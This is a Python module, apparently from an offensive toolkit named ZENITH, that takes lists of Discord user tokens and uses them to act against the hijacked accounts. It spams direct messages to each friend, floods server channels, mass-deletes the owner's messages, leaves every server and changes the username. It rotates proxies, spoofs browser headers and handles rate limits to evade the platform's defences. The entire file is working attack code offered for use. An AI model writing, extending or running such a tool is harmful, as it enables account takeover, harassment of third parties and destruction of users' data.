"""
ZENITH — modules/discord/account_nuker.py
Given a list of Discord user tokens, execute a configurable sequence of
destructive account actions: DM spam, channel spam, mass-leave servers,
username/avatar rotation, message deletion.
All network calls are non-blocking — every public entry point runs in a
worker thread managed by core.thread_manager.
"""

from __future__ import annotations
import time
import random
import string
import threading
from typing import Callable

import requests

import core.logger as log
from core.event_bus import bus
from core.database import log_action
from utils.proxy_rotator import ProxyRotator
from utils.rate_limiter import RateLimiter

MODULE = "DISCORD.NUKER"
BASE   = "https://discord.com/api/v10"

HEADERS_TMPL = {
    "Content-Type":    "application/json",
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/120.0.0.0 Safari/537.36",
    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0=",
}


def _headers(token: str) -> dict:
    h = dict(HEADERS_TMPL)
    h["Authorization"] = token
    return h


def _mask(token: str) -> str:
    return token[:10] + "..." + token[-4:] if len(token) > 14 else "***"


def _backoff(attempt: int) -> None:
    delay = min(2 ** attempt + random.uniform(0, 1), 30)
    time.sleep(delay)


def _request(method: str, endpoint: str, token: str,
             proxy: dict | None = None, **kwargs) -> requests.Response | None:
    url = f"{BASE}{endpoint}"
    for attempt in range(4):
        try:
            r = requests.request(method, url, headers=_headers(token),
                                 proxies=proxy, timeout=15, **kwargs)
            if r.status_code == 429:
                retry_after = r.json().get("retry_after", 2.0)
                log.warning(MODULE, f"Rate limited — sleeping {retry_after:.1f}s")
                time.sleep(float(retry_after) + 0.3)
                continue
            return r
        except requests.RequestException as exc:
            log.warning(MODULE, f"Request error (attempt {attempt+1}): {exc}")
            _backoff(attempt)
    return None


# ── Token validation ──────────────────────────────────────────────────────────

def validate_token(token: str, proxy: dict | None = None) -> tuple[bool, dict]:
    r = _request("GET", "/users/@me", token, proxy)
    if r and r.status_code == 200:
        return True, r.json()
    return False, {}


# ── Action primitives ─────────────────────────────────────────────────────────

def _get_friends(token: str, proxy: dict | None) -> list[dict]:
    r = _request("GET", "/users/@me/relationships", token, proxy)
    return r.json() if r and r.status_code == 200 else []


def _dm_user(token: str, user_id: str, message: str,
             proxy: dict | None, count: int, delay_ms: int) -> int:
    # Open DM channel
    r = _request("POST", "/users/@me/channels", token, proxy,
                 json={"recipient_id": user_id})
    if not r or r.status_code not in (200, 201):
        return 0
    channel_id = r.json().get("id")
    sent = 0
    for _ in range(count):
        rs = _request("POST", f"/channels/{channel_id}/messages", token, proxy,
                      json={"content": message})
        if rs and rs.status_code in (200, 201):
            sent += 1
        time.sleep(delay_ms / 1000)
    return sent


def _get_guilds(token: str, proxy: dict | None) -> list[dict]:
    r = _request("GET", "/users/@me/guilds", token, proxy)
    return r.json() if r and r.status_code == 200 else []


def _get_channels(token: str, guild_id: str,
                  proxy: dict | None) -> list[dict]:
    r = _request("GET", f"/guilds/{guild_id}/channels", token, proxy)
    if not r or r.status_code != 200:
        return []
    return [c for c in r.json() if c.get("type") == 0]  # text only


def _spam_channel(token: str, channel_id: str, message: str,
                  count: int, delay_ms: int, proxy: dict | None) -> int:
    sent = 0
    for _ in range(count):
        r = _request("POST", f"/channels/{channel_id}/messages", token, proxy,
                     json={"content": message})
        if r and r.status_code in (200, 201):
            sent += 1
        time.sleep(delay_ms / 1000)
    return sent


def _leave_guild(token: str, guild_id: str, proxy: dict | None) -> bool:
    r = _request("DELETE", f"/users/@me/guilds/{guild_id}", token, proxy)
    return r is not None and r.status_code == 204


def _change_username(token: str, new_name: str, password: str,
                     proxy: dict | None) -> bool:
    r = _request("PATCH", "/users/@me", token, proxy,
                 json={"username": new_name, "password": password})
    return r is not None and r.status_code == 200


def _change_avatar(token: str, avatar_b64: str, proxy: dict | None) -> bool:
    r = _request("PATCH", "/users/@me", token, proxy,
                 json={"avatar": f"data:image/png;base64,{avatar_b64}"})
    return r is not None and r.status_code == 200


def _delete_own_messages(token: str, channel_id: str, author_id: str,
                          proxy: dict | None) -> int:
    deleted = 0
    before = None
    while True:
        params = {"limit": 100}
        if before:
            params["before"] = before
        r = _request("GET", f"/channels/{channel_id}/messages", token, proxy,
                     params=params)
        if not r or r.status_code != 200:
            break
        msgs = [m for m in r.json() if m.get("author", {}).get("id") == author_id]
        if not msgs:
            break
        before = msgs[-1]["id"]
        for msg in msgs:
            rd = _request("DELETE", f"/channels/{channel_id}/messages/{msg['id']}",
                          token, proxy)
            if rd and rd.status_code == 204:
                deleted += 1
            time.sleep(0.4)
    return deleted


# ── Main worker ───────────────────────────────────────────────────────────────

def run_nuke(
    token:            str,
    actions:          dict,       # {action_key: bool | dict}
    delay_ms:         int,
    proxy_rotator:    ProxyRotator | None,
    result_callback:  Callable[[dict], None],
    stop_event:       threading.Event,
) -> None:
    """
    Worker target. Called per-token from the panel's thread pool.
    result_callback receives a dict with status + action counts.
    """
    proxy = proxy_rotator.next() if proxy_rotator else None
    result = {
        "token":             _mask(token),
        "status":            "starting",
        "dms_sent":          0,
        "channel_msgs":      0,
        "servers_left":      0,
        "msgs_deleted":      0,
        "username_changed":  False,
    }

    try:
        # validate
        valid, me = validate_token(token, proxy)
        if not valid:
            result["status"] = "invalid_token"
            result_callback(result)
            log.error(MODULE, f"Token {_mask(token)} is invalid.")
            return

        author_id = me.get("id")
        log.info(MODULE, f"Token {_mask(token)} valid — user {me.get('username')}")
        result["status"] = "running"

        # DM spam
        if not stop_event.is_set() and actions.get("dm_friends"):
            cfg = actions["dm_friends"]
            friends = _get_friends(token, proxy)
            for friend in friends:
                if stop_event.is_set():
                    break
                uid  = friend.get("id") or (friend.get("user") or {}).get("id")
                if not uid:
                    continue
                sent = _dm_user(token, uid, cfg.get("message", "ZENITH"),
                                proxy, cfg.get("count", 1), delay_ms)
                result["dms_sent"] += sent
                log.success(MODULE, f"DM'd user {uid} — {sent} msg(s)")

        # Channel spam
        if not stop_event.is_set() and actions.get("spam_channels"):
            cfg    = actions["spam_channels"]
            guilds = _get_guilds(token, proxy)
            for guild in guilds:
                if stop_event.is_set():
                    break
                gid      = guild.get("id")
                channels = _get_channels(token, gid, proxy)
                for ch in channels[:3]:  # max 3 channels per server
                    if stop_event.is_set():
                        break
                    n = _spam_channel(token, ch["id"], cfg.get("message", "ZENITH"),
                                      cfg.get("count", 1), delay_ms, proxy)
                    result["channel_msgs"] += n

        # Message deletion
        if not stop_event.is_set() and actions.get("delete_messages"):
            guilds = _get_guilds(token, proxy)
            for guild in guilds:
                if stop_event.is_set():
                    break
                gid      = guild.get("id")
                channels = _get_channels(token, gid, proxy)
                for ch in channels:
                    if stop_event.is_set():
                        break
                    d = _delete_own_messages(token, ch["id"], author_id, proxy)
                    result["msgs_deleted"] += d

        # Leave all servers
        if not stop_event.is_set() and actions.get("leave_servers"):
            guilds = _get_guilds(token, proxy)
            for guild in guilds:
                if stop_event.is_set():
                    break
                if _leave_guild(token, guild.get("id"), proxy):
                    result["servers_left"] += 1
                    log.info(MODULE, f"Left guild {guild.get('name', guild.get('id'))}")
                time.sleep(delay_ms / 1000)

        # Username change
        if not stop_event.is_set() and actions.get("change_username"):
            cfg  = actions["change_username"]
            name = cfg.get("name") or "".join(
                random.choices(string.ascii_lowercase, k=8))
            ok = _change_username(token, name, cfg.get("password", ""), proxy)
            result["username_changed"] = ok
            log.info(MODULE, f"Username change {'ok' if ok else 'failed'}")

        result["status"] = "complete" if not stop_event.is_set() else "stopped"

    except Exception as exc:
        result["status"] = "error"
        result["error"]  = str(exc)
        log.error(MODULE, f"Nuke worker exception: {exc}")

    finally:
        result_callback(result)
        log_action(MODULE, "account_nuke", _mask(token), result["status"])
        bus.publish(bus.ACTION_RESULT, {
            "module": MODULE, "action": "nuke",
            "target": _mask(token), "result": result["status"]
        })
